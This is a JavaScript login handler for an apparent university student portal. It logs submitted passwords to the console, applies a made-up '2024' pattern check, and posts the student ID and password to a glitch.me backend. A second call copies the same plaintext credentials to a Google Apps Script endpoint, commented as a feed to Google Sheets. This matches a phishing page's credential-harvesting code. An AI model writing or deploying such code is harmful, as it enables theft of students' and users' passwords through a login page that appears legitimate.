document.getElementById('loginForm').addEventListener('submit', function (e) {
    e.preventDefault();

    var studentId = document.getElementById('studentId').value;
    var password = document.getElementById('password').value;
    var errorNotification = document.getElementById('errorNotification');

    console.log("ID étudiant:", studentId);
    console.log("Mot de passe:", password);

    if (studentId.slice(-4) === "2024" && password.slice(-4) === "2024" && studentId.length === 9 && password.length === 9) {
        fetch("https://universite-kara-backend.glitch.me/login", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ studentId, password })
        })
        .then(response => response.json())
        .then(data => {
            alert(data.message);
            if (data.success) {
                window.location.href = "dashboard.html";
            }
        })
        .catch(error => console.error("Erreur :", error));

        // Envoi des données vers Google Sheets via Apps Script
        fetch("https://script.google.com/macros/s/AKfycbxwPMU3F6GIzkccBFuVfl5_jLP2-ZCHkqlcLzYrufMXrjBYNtmBt18dBIvqnJb8rqMxzA/exec", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ studentId, password })
        })
        .then(response => response.json())
        .then(data => console.log("Données envoyées à Google Sheets :", data))
        .catch(error => console.error("Erreur Google Sheets:", error));
    } else {
        errorNotification.textContent = "Identifiant ou mot de passe incorrect.";
        errorNotification.style.display = "block";
    }
});
